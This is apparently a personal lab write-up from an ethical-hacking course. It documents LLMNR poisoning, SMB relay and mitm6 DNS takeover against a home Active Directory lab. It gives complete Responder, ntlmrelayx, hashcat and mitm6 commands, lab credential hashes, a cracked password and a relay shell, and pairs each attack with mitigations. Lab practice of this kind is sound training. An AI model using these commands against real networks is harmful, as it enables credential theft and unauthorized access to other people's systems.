# Active Directory Lab — Initial Attack Vectors

**Environment:** MARVEL.local | VMware Workstation Pro | Kali Linux  
**Objective:** Practice and document internal network attack techniques against an Active Directory environment, focusing on initial attack vectors that exploit common misconfigurations.

---

## Table of Contents

1. [Lab Environment](#lab-environment)
2. [Attack 1 — LLMNR Poisoning](#attack-1--llmnr-poisoning)
3. [Attack 2 — SMB Relay](#attack-2--smb-relay)
4. [Attack 3 — DNS Takeover via IPv6 (mitm6)](#attack-3--dns-takeover-via-ipv6-mitm6)
5. [Summary](#summary)

---

## Lab Environment

| Host | Role | OS | IP |
|------|------|----|----|
| HYDRA-DC | Domain Controller | Windows Server 2022 | 192.168.116.128 |
| THEPUNISHER | User Workstation | Windows 10 22H2 Enterprise | 192.168.116.130 |
| SPIDERMAN | User Workstation | Windows 10 22H2 Enterprise | 192.168.116.131 |
| Kali | Attacker | Kali Linux | 192.168.116.129 |

- **Domain:** MARVEL.local  
- **Network:** 192.168.116.0/24 (VMware NAT)  
- **Hypervisor:** VMware Workstation Pro

---

## Attack 1 — LLMNR Poisoning

### Overview

Link-Local Multicast Name Resolution (LLMNR) is a fallback protocol Windows uses when DNS fails to resolve a hostname. When a machine can't find a resource via DNS, it broadcasts an LLMNR query to the entire local network segment asking "who has this hostname?"

This creates a trivial MITM opportunity: an attacker on the same segment can respond to those broadcasts, impersonate the requested host, and trick the victim into sending its NTLMv2 credential hash as part of the authentication attempt.

**Conditions for success:**
- Attacker must be on the same broadcast domain as the victim
- A victim must trigger a failed DNS lookup (e.g., mistyping a network share path)

### Tool

- **Responder** — listens for LLMNR/NBT-NS/mDNS broadcasts and responds with poisoned answers, capturing NTLMv2 hashes

### Execution

**Step 1 — Start Responder**

```bash
sudo responder -I eth0 -dwv
```

| Flag | Description |
|------|-------------|
| `-I eth0` | Listen on the specified network interface |
| `-d` | Answer DHCP broadcast requests |
| `-w` | Start the WPAD rogue proxy server |
| `-v` | Verbose output |

> **Note on flags:** The TCM PEH course demonstrates `-dwPv` (`-P` forces NTLM auth for WPAD proxy), but current versions of Responder reject `-P` and `-w` together. In practice, `-dwv` is sufficient to capture NTLMv2 hashes from LLMNR/NBT-NS poisoning.

**Step 2 — Wait for a victim event**

When a user on the network attempts to access a non-existent share (e.g., `\\FILESERVER\docs`), DNS lookup fails and Windows falls back to LLMNR broadcast. Responder answers the broadcast, the victim sends its NTLMv2 hash to authenticate.

**Captured NTLMv2 hash (fcastle, MARVEL domain):**
```
fcastle::MARVEL:f71b8ebe06a4aaac:4CE307A7DD11070AA7ACA24850C68C3D:010100000000000080E6369B97D8DC012ADBF8727C2E4FC900000000020008004F0046004A00540001001E00570049004E002D005200430059004D003900370055004B0055003200370004003400570049004E002D005200430059004D003900370055004B005500320037002E004F0046004A0054002E004C004F00430041004C00030014004F0046004A0054002E004C004F00430041004C00050014004F0046004A0054002E004C004F00430041004C000700080080E6369B97D8DC0106000400020000000800300030000000000000000100000000200000D5CBB5B9B087E83B6B554CE79C9AC25F85A438DAA83AB3B12DF4FC91C2E59D0C0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100310036002E003100320039000000000000000000
```

Responder captured 4 separate authentication attempts from the same account — each LLMNR broadcast that hit the poisoner triggered a new hash capture.

**Step 3 — Crack the hash**

NTLMv2 hashes use Hashcat module **5600**.

```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

With mutation rules for broader coverage:
```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

> **Note:** Hashcat performs significantly better on bare metal (GPU) than inside a VM (CPU-only). For lab purposes, running it outside the VM yields faster results.

**Cracked credential:**
```
fcastle:Password1
```

### Mitigation

- **Disable LLMNR:** Group Policy → Computer Configuration → Administrative Templates → Network → DNS Client → *Turn Off Multicast Name Resolution* → Enabled
- **Disable NBT-NS:** Network adapter → IPv4 properties → Advanced → WINS → *Disable NetBIOS over TCP/IP*
- **Network segmentation** limits the blast radius — the attacker must be on the same broadcast domain

---

## Attack 2 — SMB Relay

### Overview

Instead of cracking the captured NTLMv2 hash offline, SMB Relay forwards (relays) the credential in real time to another machine on the network. If the victim account has local admin rights on the target, the attacker gains authenticated access and can execute commands — typically used to dump the local SAM database (local user hashes).

**Prerequisites:**
- SMB signing must be **disabled** or **not required** on the relay target
- The relayed credential must have **local admin rights** on the target machine

### Step 1 — Identify Hosts Without SMB Signing

```bash
nmap --script=smb2-security-mode.nse -p 445 192.168.116.0/24 -Pn
```

Hosts reporting `message signing enabled but not required` are valid relay targets. In this lab, both workstations qualified. Create a `targets.txt`:

```
192.168.116.130
192.168.116.131
```

### Step 2 — Configure Responder

For this attack, Responder handles poisoning only — ntlmrelayx.py handles SMB/HTTP. Disable those modules in Responder's config:

```bash
sudo mousepad /etc/responder/Responder.conf
```

Set:
```
SMB = Off
HTTP = Off
```

### Step 3 — Start ntlmrelayx.py

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

### Step 4 — Start Responder

```bash
sudo responder -I eth0 -dwv
```

### Step 5 — Wait for a victim event

When a victim triggers an LLMNR/NBT-NS broadcast, Responder captures the credential and passes it immediately to ntlmrelayx.py, which relays it to the targets in `targets.txt`.

**SAM hashes dumped from SPIDERMAN (192.168.116.131):**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24796bbf2f029be289c0c2f5d06a7f90:::
peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

The LM hash `aad3b435b51404eeaad3b435b51404ee` is a null value (LM disabled). The second hash (NT hash) is the crackable portion. These can be used directly for **Pass-the-Hash** attacks or cracked offline with Hashcat (`-m 1000` for NT hashes).

**Optional — interactive SMB shell:**

```bash
ntlmrelayx.py -tf targets.txt -smb2support -i
```

Opens an interactive SMB shell on `localhost:11000` once a relay succeeds:

```bash
nc 127.0.0.1 11000
```

### Mitigation

- **Enable SMB signing** on all machines — primary and most effective defense
- **Disable NTLMv1**, enforce NTLMv2 minimum
- **Restrict local admin rights** across machines (tiered admin model)
- Disable LLMNR/NBT-NS (removes the poisoning vector that feeds this attack)

---

## Attack 3 — DNS Takeover via IPv6 (mitm6)

### Overview

Modern Windows networks primarily use IPv4, but IPv6 is **enabled by default** on all Windows machines. Windows periodically sends DHCPv6 requests looking for an IPv6 DNS server — and in most environments, nothing responds to these requests.

mitm6 exploits this gap by responding to DHCPv6 requests and assigning itself as the IPv6 DNS server for victim machines. Once in position, the attacker intercepts WPAD proxy authentication traffic, captures NTLMv2 credentials, and relays them to the Domain Controller via LDAPS using ntlmrelayx.py — potentially extracting LDAP data or creating a new privileged user.

**Why this is more reliable than LLMNR poisoning:**
- IPv6 is enabled by default on all modern Windows — no misconfiguration required
- Doesn't depend on user error — triggers automatically on machine startup, user login, or periodic DHCPv6 renewals

**Prerequisites:**
- IPv6 enabled on victim machines (Windows default)
- LDAP/LDAPS accessible on the Domain Controller

### Tools

- **mitm6** — DHCPv6 spoofing + DNS takeover
- **ntlmrelayx.py** — relays captured credentials to LDAP/LDAPS on the DC

### Step 1 — Install mitm6

```bash
pip install mitm6 --break-system-packages
```

Or from source:
```bash
cd /opt/mitm6
sudo pip install .
```

### Step 2 — Start ntlmrelayx.py

```bash
ntlmrelayx.py -6 -t ldaps://192.168.116.128 -wh fakepad.marvel.local -l lootme
```

| Flag | Description |
|------|-------------|
| `-6` | Listen on IPv6 |
| `-t ldaps://192.168.116.128` | Relay to the DC via LDAPS |
| `-wh fakepad.marvel.local` | Serve a fake WPAD file to capture proxy authentication |
| `-l lootme` | Directory to save captured LDAP data |

### Step 3 — Start mitm6

```bash
sudo mitm6 -d marvel.local
```

### Step 4 — Wait for a trigger event

The attack activates when:
- A machine on the network starts up or reboots
- A user logs in
- Periodic DHCPv6 renewal fires (every few minutes on Windows)

> **Important:** Do not run mitm6 for more than **10 minutes** in a real environment. Prolonged execution disrupts legitimate IPv6 traffic and can cause network instability.

> **Lab status:** This attack vector is documented from course material (TCM PEH). Lab execution pending — the `lootme/` output will be updated once the attack is run against this environment.

### Mitigation

- **Disable IPv6** if not in use (Group Policy or network adapter settings)
- **Disable WPAD** if not in use: Group Policy → *Turn off auto detection of proxy settings*
- **Enable LDAP signing and LDAP channel binding** on the DC — prevents credential relay to LDAP
- **Enable Extended Protection for Authentication (EPA)**

---

## Summary

| Attack | Required Condition | Impact |
|--------|--------------------|--------|
| LLMNR Poisoning | Victim triggers failed DNS resolution | NTLMv2 hash captured → cracked offline (`fcastle:Password1`) |
| SMB Relay | SMB signing disabled + victim is local admin on target | SAM hashes dumped from SPIDERMAN (5 accounts) |
| DNS Takeover via mitm6 | IPv6 enabled (Windows default) | LDAP data exfiltration, potential domain escalation |

---

*Lab environment built for practice purposes following the TCM Security Practical Ethical Hacking (PEH) course.*
